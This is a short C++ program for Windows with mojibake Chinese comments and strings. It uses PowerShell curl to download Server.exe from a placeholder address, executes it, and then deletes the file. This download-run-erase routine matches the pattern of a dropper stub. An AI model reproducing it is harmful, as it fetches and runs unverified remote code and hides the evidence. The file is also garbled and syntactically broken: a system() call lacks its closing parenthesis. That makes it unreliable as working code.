#include<iostream>
#include<Windows.h>
using namespace std;
int main() {
	cout << "�������ط���������򡣡���\n";
	system("powershell curl -o Server.exe <���ص�ַ> ";		//���ط����
	cout << "������Extract��\n";
	system("Server.exe");	//�����Խ�ѹ����
	system("DEL Server.exe");	//ɾ���Խ�ѹ����
	return 0;
}
